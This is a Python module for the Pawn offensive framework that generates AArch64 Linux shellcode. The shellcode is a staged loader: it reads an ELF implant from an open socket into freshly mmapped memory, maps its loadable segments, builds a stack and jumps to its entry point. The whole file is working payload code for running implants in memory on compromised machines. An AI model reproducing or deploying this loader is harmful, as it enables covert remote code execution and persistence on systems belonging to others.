"""
This module requires Pawn: https://github.com/EntySec/Pawn
Current source: https://github.com/EntySec/Pawn
"""

from textwrap import dedent

from pex.assembler import Assembler

from pawn.lib.module import *


class PawnModule(Module, Assembler):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Name': "linux/aarch64/loader",
            'Authors': [
                'pwntools - original payload'
                'Ivan Nikolsky (enty8080) - payload developer',
            ],
            'Arch': ARCH_AARCH64,
            'Platform': OS_LINUX,
            'Type': "one_side",
        })

        self.length = IntegerOption(None, 'Length of the implant.', True)
        self.reliable = BooleanOption('yes', 'Make payload reliable.', True)

        self.sock = Option('x12', 'Register in which sock is located.', True, True)

    def run(self):
        payload = dedent(f"""\
        mmap:
            ldr x2, ={hex(self.length.value)}
            mov x10, x2

            lsr x2, x2, 0xc
            add x2, x2, 1
            lsl x2, x2, 0xc

            mov x0, xzr
            mov x1, x2
            mov x2, 6
            mov x3, 0x22
            mov x4, xzr
            mov x5, xzr
            mov x8, 0xde
            svc 0

            mov x4, x10
            mov x3, x0
            mov x10, x0

        read:
            mov x0, {self.sock.value}
            mov x1, x3
            mov x2, x4
            mov x8, 0x3f
            svc 0
        """)

        if self.reliable.value:
            payload += dedent("""\
                cbz w0, fail
            """)

        payload += dedent("""\
            add x3, x3, x0
            subs x4, x4, x0
            bne read
        """)

        if self.reliable.value:
            payload += dedent("""\
            sanity:
                mov x0, x10
                ldr x1, [x0]
                mov x2, 0x457f
                movk x2, 0x464c, lsl 0x10
                cmp w1, w2
                bne fail
            """)

        payload += dedent(f"""\
        headers:
            add x1, x0, 0x20
            ldr x1, [x1]
            add x1, x1, x0
            add x2, x0, 0x36
            ldrh w2, [x2]
            add x3, x0, 0x38
            ldrh w3, [x3]

        load_all:
            stp x0, x1, [sp, -0x10]!
            stp x2, x3, [sp, -0x10]!
            bl load_one
            ldp x2, x3, [sp], 0x10
            ldp x0, x1, [sp], 0x10

            add x1, x1, x2
            subs x3, x3, 1
            bne load_all

            add x1, x0, 0x18
            ldr x1, [x1]
            mov x8, x1

        stack:
            eor x0, x0, x0
            eor x1, x1, x1
            stp x0, x1, [sp, -0x10]!
            mov x2, 0x19
            mov x3, sp
            stp x2, x3, [sp, -0x10]!

            stp x0, x1, [sp, -0x10]!
            mov x2, 1
            mov x3, sp
            stp x2, x3, [sp, -0x10]!

            ldr x3, [sp, 8]
            mov x1, {self.sock.value}
            str x1, [x3]

            br x8

        load_one:
            stp x29, x30, [sp, -0x10]!
            mov x29, sp
            add x2, x1, 0
            ldr x2, [x2]
            uxth w2, w2
            cmp x2, 1
            bne next_phdr

            add x2, x1, 0x10
            ldr x2, [x2]

            add x3, x1, 0x28
            ldr x3, [x3]
            lsr w3, w3, 0xc
            add x3, x3, 1

        brk:
            lsl w3, w3, 0x10
            stp x0, x1, [sp, -0x10]!
            stp x2, x3, [sp, -0x10]!
            lsr w2, w2, 0xc
            lsl w2, w2, 0xc

            mov x0, x2
            mov x1, x3
            mov x2, 7
            mov x3, 0x22
            mov x4, xzr
            mov x5, xzr
            mov x8, 0xde
            svc 0

            ldp x2, x3, [sp], 0x10
            ldp x0, x1, [sp], 0x10

            add x4, x1, 8
            ldr x4, [x4]
            add x4, x4, x0
            add x5, x1, 0x20
            ldr x5, [x5]

            stp x0, x1, [sp, -0x10]!
            stp x2, x3, [sp, -0x10]!
            stp x4, x5, [sp, -0x10]!
            mov x0, x2
            mov x1, x4
            mov x2, x5

        memcpy:
            ldrb w3, [x1], 1
            strb w3, [x0], 1
            subs x2, x2, 1
            bge memcpy

            ldp x4, x5, [sp], 0x10
            ldp x2, x3, [sp], 0x10
            ldp x0, x1, [sp], 0x10

        next_phdr:
            mov sp, x29
            ldp x29, x30, [sp], 0x10
            ret
        """)

        if self.reliable.value:
            payload += dedent("""\
            fail:
                mov x0, 1
                mov x8, 0x5d
                svc 0
            """)

        return self.assemble(
            self.details['Arch'], payload)
